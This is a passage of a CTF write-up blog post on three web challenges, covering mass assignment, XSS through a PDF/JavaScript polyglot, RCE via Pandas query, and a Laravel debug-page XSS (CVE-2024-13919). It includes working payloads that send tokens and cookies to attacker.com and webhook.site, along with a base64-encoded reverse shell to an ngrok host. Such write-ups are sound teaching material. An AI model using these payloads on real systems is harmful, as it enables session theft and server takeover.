+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@api.post(<span class="params"><span class="string">&#x27;/register&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">user: UserCreate, db: Session = Depends(<span class="params">get_db</span>)</span>):</span><br><span class="line">    db_user = db.query(User).<span class="built_in">filter</span>(User.username == user.username).first()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> db_user:</span><br><span class="line">        <span class="keyword">raise</span> HTTPException(status_code=<span class="number">400</span>, detail=<span class="string">&quot;Username already taken.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    db_user = User(username=user.username, password=user.password, is_admin=user.is_admin)</span><br><span class="line">    db.add(db_user)</span><br><span class="line">    db.commit()</span><br><span class="line">    db.refresh(db_user)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;access_token&quot;</span>: create_access_token(db_user.<span class="built_in">id</span>, db_user.is_admin)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>by supplying this data to the register endpoint, we can become admin:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;grrgrr&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;grrgrr&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;is_admin&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/HyweQAcnxg.png" alt="image"><br>Yey… Now how do we get the real admin with flag in the password creds with XSS? First, we need to found out what protection exists. The CSP Configuration is as follows:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-src &#x27;none&#x27;; script-src &#x27;self&#x27;; img-src &#x27;self&#x27; data:; style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; connect-src *;</span><br></pre></td></tr></table></figure>
+
+<p>Using CSP evaluator, we have a little warning in this <code>script-src &#39;self&#39;</code> part</p>
+<blockquote>
+<p>‘self’ can be problematic if you host JSONP, AngularJS or user uploaded files.<br><img src="https://hackmd.io/_uploads/SJDYPyo2lx.png" alt="image"></p>
+</blockquote>
+<p>In short, this settings might be an issue if we can submit file that contains XSS payload. But how?<br>In Challenge component, we can see that a script loaded dynamically, below is the script</p>
+<blockquote>
+<p><em>frontend&#x2F;src&#x2F;components&#x2F;Challenge.js</em></p>
+</blockquote>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Challenge</span>(<span class="params">&#123;id, title, description, score, draft, attachment_filename, alreadySolved&#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> [flag, setFlag] = <span class="title function_">useState</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> [message, setMessage] = <span class="title function_">useState</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> [error, setError] = <span class="title function_">useState</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> [solved, setSolved] = <span class="title function_">useState</span>(alreadySolved);</span><br><span class="line">    <span class="keyword">const</span> descriptionRef = <span class="title function_">useRef</span>();</span><br><span class="line"></span><br><span class="line">    <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      descriptionRef.<span class="property">current</span>.<span class="property">innerHTML</span> = description;</span><br><span class="line">      <span class="title function_">loadScriptDynamically</span>();</span><br><span class="line">    &#125;, [description]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">loadScriptDynamically</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> scriptElements = descriptionRef.<span class="property">current</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">        scriptElements.<span class="title function_">forEach</span>(<span class="function">(<span class="params">scriptElem</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> newScriptElem = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">          <span class="keyword">if</span> (scriptElem.<span class="property">src</span>) &#123;</span><br><span class="line">            newScriptElem.<span class="property">src</span> = scriptElem.<span class="property">src</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            newScriptElem.<span class="property">textContent</span> = scriptElem.<span class="property">textContent</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          descriptionRef.<span class="property">current</span>.<span class="title function_">appendChild</span>(newScriptElem);</span><br><span class="line">          scriptElem.<span class="title function_">remove</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>The script will dynamically loaded based on javascript source inside the description part, which means, if we able to submit a file with XSS script inside, then we can refer that file as script source. But… how?</p>
+<p>The only way we can create stored files, is in the create challenge endpoint, we can add attachment as part of the challenge set. Yet, we can only submit file with below extensions and mime type:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;png&quot;: &quot;image/png&quot;</span><br><span class="line">&quot;jpg&quot;: &quot;image/jpeg&quot;</span><br><span class="line">&quot;jpeg&quot;: &quot;image/jpeg&quot;</span><br><span class="line">&quot;gif&quot;: &quot;image/gif&quot;</span><br><span class="line">&quot;pdf&quot;: &quot;application/pdf&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Of course XSS in the pdf using jspdf or something won’t help, since the context will be in the pdf context, not document, so we can’t extract the target cookies or localStorage. But here’s the trick, below is how the file Mime checking is done:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file_extension = challenge.attachment_filename.split(<span class="string">&quot;.&quot;</span>)[-<span class="number">1</span>].lower()</span><br><span class="line">file_mimetype = magic.from_buffer(file_content, mime=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">if</span> file_extension <span class="keyword">not</span> <span class="keyword">in</span> ALLOWED_FILETYPES:</span><br><span class="line">    <span class="keyword">raise</span> HTTPException(status_code=<span class="number">400</span>, detail=<span class="string">&quot;Invalid attachment extension.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> file_mimetype != ALLOWED_FILETYPES[file_extension]:</span><br><span class="line">    <span class="keyword">raise</span> HTTPException(status_code=<span class="number">400</span>, detail=<span class="string">&quot;Invalid attachment mimetype.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> file_extension == <span class="string">&quot;pdf&quot;</span>:</span><br><span class="line">    file_name = os.path.join(<span class="string">&quot;pdf&quot;</span>, uuid4().<span class="built_in">hex</span> + <span class="string">&quot;.&quot;</span> + file_extension)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    file_name = os.path.join(<span class="string">&quot;images&quot;</span>, uuid4().<span class="built_in">hex</span> + <span class="string">&quot;.&quot;</span> + file_extension)</span><br></pre></td></tr></table></figure>
+
+<p><code>magic.from_buffer</code> is not a common way to check the file mime, it just check if a spesific magic byte is exists in a buffer, not validate if the format is in a right way, in short, it works like</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">b&quot;PDF&quot;</span> <span class="keyword">in</span> buffer:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;application/pdf&quot;</span></span><br></pre></td></tr></table></figure>
+<p>We can make pdf file like gedagedi.pdf with content as below:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.<span class="title function_">replace</span>(<span class="string">&quot;http://attacker.com?c=&quot;</span>+<span class="variable language_">localStorage</span>.<span class="property">token</span>)<span class="comment">//%PDF-brrbrrpatapim</span></span><br></pre></td></tr></table></figure>
+<p>and it will counted as a valid pdf, and a valid js content because we commented verything behind the valid js payload.</p>
+<ol>
+<li>Create challenge with XSS payload in the PDF as attachment</li>
+<li>Create challenge again with the PDF as script source inside the description.</li>
+<li>Access the page, the XSS will be triggered</li>
+</ol>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><ol>
+<li>Create payload (must be base64 encoded)<br><img src="https://hackmd.io/_uploads/SJzZTA52xx.png" alt="image"></li>
+<li>Submit as pdf<br><img src="https://hackmd.io/_uploads/HkGX6R9heg.png" alt="image"></li>
+<li>Take the document as our payload source<br><img src="https://hackmd.io/_uploads/BJrUaCq3xx.png" alt="image"></li>
+<li>Make another challenge with the script html tag with pdf file as the script source to trigger script dynamic load.<br><img src="https://hackmd.io/_uploads/Hk3JJksnlx.png" alt="image"></li>
+<li>Visit the main page again will trigger the XSS<br><img src="https://hackmd.io/_uploads/S1azk1ihgl.png" alt="image"></li>
+</ol>
+<p>Now with the same flow, we do it again but now we use the report endpoint to trigger the bot visitting the main page<br><img src="https://hackmd.io/_uploads/B1A0k1i2lx.png" alt="image"><br><img src="https://hackmd.io/_uploads/ry-xgyinlx.png" alt="image"><br>Now we can set the token to our local storage, and we become the target user<br><img src="https://hackmd.io/_uploads/B1cUxkihxe.png" alt="image"><br>We get the flag in the password field<br><img src="https://hackmd.io/_uploads/ByKFlJjngl.png" alt="image"></p>
+<h2 id="CSV"><a href="#CSV" class="headerlink" title="CSV"></a>CSV</h2><ul>
+<li>🤔Difficulity: Easy</li>
+<li>🕸️Vulnerability: RCE in Pandas <code>query</code></li>
+</ul>
+<h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h3><p>We’re given a web where we able to submit a CSV and it will do analysis in the files using df.query.</p>
+<h3 id="Approach-1"><a href="#Approach-1" class="headerlink" title="Approach"></a>Approach</h3><p>Looking through the website, yes a pandas query can become and RCE if not handled properly. From this <a target="_blank" rel="noopener" href="https://ctftime.org/writeup/36155">WriteUp</a>, we can do easily getting RCE. The vulnerable part lies here:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> df.empty:</span><br><span class="line">    unique_counts = df.nunique()</span><br><span class="line">    query_column = unique_counts.idxmax()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> df[query_column].dtype == <span class="string">&#x27;object&#x27;</span>:</span><br><span class="line">        query_value = df[query_column].mode()[<span class="number">0</span>]</span><br><span class="line">        query_string = <span class="string">f&quot;`<span class="subst">&#123;query_column&#125;</span>` == &#x27;<span class="subst">&#123;query_value&#125;</span>&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        query_value = df[query_column].mean()</span><br><span class="line">        query_string = <span class="string">f&quot;`<span class="subst">&#123;query_column&#125;</span>` &gt; <span class="subst">&#123;query_value&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        query_result_df = df.query(query_string)</span><br><span class="line">        query_result = query_result_df.head().to_json(orient=<span class="string">&#x27;split&#x27;</span>)</span><br><span class="line">        query_result_count = <span class="built_in">len</span>(query_result_df)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;err&#125;</span>&quot;</span>&#125;), <span class="number">500</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><p>Now, all we need to do is, is create csv file as follow to get reverse shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;1`+(@pd.io.common.os.popen(&#x27;echo c2ggLWkgPiYgL2Rldi90Y3AvMC50Y3AuYXAubmdyb2suaW8vMTI4OTEgMD4mMQ== | base64 -d | bash -i&#x27;).read())#`&quot;</span><br><span class="line">&quot;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>submit it, and we get access to the server<br><img src="https://hackmd.io/_uploads/B1KeV1j2ge.png" alt="image"></p>
+<h2 id="Impossible-XSS"><a href="#Impossible-XSS" class="headerlink" title="Impossible XSS"></a>Impossible XSS</h2><ul>
+<li>🤔Difficulity: Easy</li>
+<li>🕸️Vulnerability: XSS in Laravel error page when debug mode is active (CVE-2024-13919)</li>
+</ul>
+<h3 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h3><p>We’re given a web where we can reflect sanitized html input we gave to the server.</p>
+<h3 id="Approach-2"><a href="#Approach-2" class="headerlink" title="Approach"></a>Approach</h3><p>First, the flag is inside the admin cookies, so it must be an XSS, but the sanitizer is pretty lit and i thought it was a zero day challenge, yet i thing it’s too hard for such a short time CTF. Then i realize something, if we visit the <code>/reflect</code> page with get method, it will shows error page which tell us it’s on debug mode:<br><img src="https://hackmd.io/_uploads/HkP4B1inlg.png" alt="image"><br>we can also verify this on the <code>.env</code> file:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">APP_NAME=Laravel</span><br><span class="line">APP_ENV=local</span><br><span class="line">APP_KEY=base64:HtLNzkY3rykO8L9XwZyF/CaMaeh/8pULhzNTWQzIpXU=</span><br><span class="line">APP_DEBUG=true</span><br><span class="line">APP_TIMEZONE=UTC</span><br><span class="line">APP_URL=http://localhost</span><br></pre></td></tr></table></figure>
+<p>then… i found out the version has a CVE record, which was <a target="_blank" rel="noopener" href="https://github.com/sbaresearch/advisories/tree/public/2024/SBA-ADV-20241209-02_Laravel_Reflected_XSS_via_Route_Parameter_in_Debug-Mode_Error_Page">CVE-2024-13919</a>. we can supplied anything in the query param with xss payload, and it will be triggered.<br><img src="https://hackmd.io/_uploads/SJ-EIys3el.png" alt="image"></p>
+<p>Now we can use this payload to get the admin cookies</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.226.138.119:5001/visit?url=http://web/reflect?payload=%3Cscript%3Elocation.replace(%22http://webhook.site/f66f6619-eb37-47bc-ad09-fb0c1c2f0040?c=%22%2bbtoa(document.cookie))%3C/script%3E</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/Hkm6Uki3gg.png" alt="image"><br><img src="https://hackmd.io/_uploads/rJvkDJinll.png" alt="image"></p>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/36155">Pandas RCE</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/sbaresearch/advisories/tree/public/2024/SBA-ADV-20241209-02_Laravel_Reflected_XSS_via_Route_Parameter_in_Debug-Mode_Error_Page">CVE-2024-13919</a></li>
+</ol>
+
+    </article>
+    <!-- license -->
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2025/12/11/ctf/web/CJN2024/" title="Cyberjawara National 2024 Quals">
+                    <div class="nextTitle">Cyberjawara National 2024 Quals</div>
+                </a>
+        </li>
+        <li class="previous">
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2025/12/11/ctf/web/AMATEURS2025/" title="Amateurs 2025">
+                    <div class="prevTitle">Amateurs 2025</div>
+                </a>
+        </li>
+    </ul>
+    <!-- comment -->
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+            
+            
+            
+            <!-- utteranc评论 -->
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+            
+            
+            
+        </div>
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    <!-- Mathjax -->
+</main>
+
+                <!-- profile -->
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+        <div class="social">
+                            <a href="//github.com/DJumanto" class="iconfont-archer github" target="_blank" title="github"></a>
+                <a href="//www.linkedin.com/in/alfafakhrur/" class="iconfont-archer linkedin" target="_blank" title="linkedin"></a>
+                <a href="/DJumanto" class="iconfont-archer discord" target="_blank" title="discord"></a>
+
+        </div>
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    <!-- 不蒜子  -->
+        <div class="busuanzi-container">
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+        </div>
+</footer>
+
+        </div>
+        <!-- toc -->
+            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%93%9A-Table-of-Contents"><span class="toc-number">1.</span> <span class="toc-text">📚 Table of Contents</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%94%8E-Summary-TL-DR"><span class="toc-number">2.</span> <span class="toc-text">🔎 Summary (TL;DR)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%A7%BE-Challenges"><span class="toc-number">3.</span> <span class="toc-text">🧾 Challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hackyesterday"><span class="toc-number">3.1.</span> <span class="toc-text">Hackyesterday</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description"><span class="toc-number">3.1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Approach"><span class="toc-number">3.1.2.</span> <span class="toc-text">Approach</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">3.1.3.</span> <span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSV"><span class="toc-number">3.2.</span> <span class="toc-text">CSV</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Approach-1"><span class="toc-number">3.2.2.</span> <span class="toc-text">Approach</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-1"><span class="toc-number">3.2.3.</span> <span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-XSS"><span class="toc-number">3.3.</span> <span class="toc-text">Impossible XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-2"><span class="toc-number">3.3.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Approach-2"><span class="toc-number">3.3.2.</span> <span class="toc-text">Approach</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">3.4.</span> <span class="toc-text">References</span></a></li></ol></li></ol>
+            </div>
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+        
+        
+        
+        
+        
+        
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 6
+        </div>
+        <!-- search  -->
+    </div>
+    <div class="post-archive">
+            <div class="archive-year"> 2025 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span>
+            <a class="archive-post-title" href="/2025/12/11/ctf/web/CJN2024/">Cyberjawara National 2024 Quals</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span>
+            <a class="archive-post-title" href="/2025/12/11/ctf/web/AMATEURS2025/">Amateurs 2025</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span>
+            <a class="archive-post-title" href="/2025/12/11/ctf/web/HACKTODAY2025/">Hacktoday 2025</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span>
+            <a class="archive-post-title" href="/2025/12/11/ctf/web/NCW2025/">Self-Love NCW 2025</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span>
+            <a class="archive-post-title" href="/2025/12/11/ctf/web/SECURINETS2025/">Securinets 2025</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span>
+            <a class="archive-post-title" href="/2025/12/11/ctf/web/HTBUNIVCTF2024/">HTB University CTF 2024</a>
+        </li>
+            </ul>
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+            <span class="sidebar-tag-name" data-tags="WEB">
+                <span class="iconfont-archer">&#xe606;</span>
+                WEB
+            </span>
+            <span class="sidebar-tag-name" data-tags="CRLF INJECTION">
+                <span class="iconfont-archer">&#xe606;</span>
+                CRLF INJECTION
+            </span>
+            <span class="sidebar-tag-name" data-tags="XS-LEAKS">
+                <span class="iconfont-archer">&#xe606;</span>
+                XS-LEAKS
+            </span>
+            <span class="sidebar-tag-name" data-tags="RCE">
+                <span class="iconfont-archer">&#xe606;</span>
+                RCE
+            </span>
+            <span class="sidebar-tag-name" data-tags="XSS">
+                <span class="iconfont-archer">&#xe606;</span>
+                XSS
+            </span>
+            <span class="sidebar-tag-name" data-tags="MASS ASSIGNMENT">
+                <span class="iconfont-archer">&#xe606;</span>
+                MASS ASSIGNMENT
+            </span>
+            <span class="sidebar-tag-name" data-tags="XXE">
+                <span class="iconfont-archer">&#xe606;</span>
+                XXE
+            </span>
+            <span class="sidebar-tag-name" data-tags="IDOR">
+                <span class="iconfont-archer">&#xe606;</span>
+                IDOR
+            </span>
+            <span class="sidebar-tag-name" data-tags="BROKEN ACCESS CONTROL">
+                <span class="iconfont-archer">&#xe606;</span>
+                BROKEN ACCESS CONTROL
+            </span>
+            <span class="sidebar-tag-name" data-tags="CLIENT SIDE PATH TRAVERSAL">
+                <span class="iconfont-archer">&#xe606;</span>
+                CLIENT SIDE PATH TRAVERSAL
+            </span>
+            <span class="sidebar-tag-name" data-tags="SQL INJECTION">
+                <span class="iconfont-archer">&#xe606;</span>
+                SQL INJECTION
+            </span>
+            <span class="sidebar-tag-name" data-tags="JWT">
+                <span class="iconfont-archer">&#xe606;</span>
+                JWT
+            </span>
+            <span class="sidebar-tag-name" data-tags="PROTOTYPE POLLUTION">
+                <span class="iconfont-archer">&#xe606;</span>
+                PROTOTYPE POLLUTION
+            </span>
+            <span class="sidebar-tag-name" data-tags="COMMAND INJECTION">
+                <span class="iconfont-archer">&#xe606;</span>
+                COMMAND INJECTION
+            </span>
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://example.com",
+        root: siteMetaRoot,
+        author: "DJumanto"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+        <!-- main func -->
+        <script src="/scripts/main.js"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
+        <!-- algolia -->
+        <!-- busuanzi -->
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        <!-- async load share.js -->
+            <script src="/scripts/share.js" async></script>
+        <!-- mermaid -->
+    </body>
+</html>
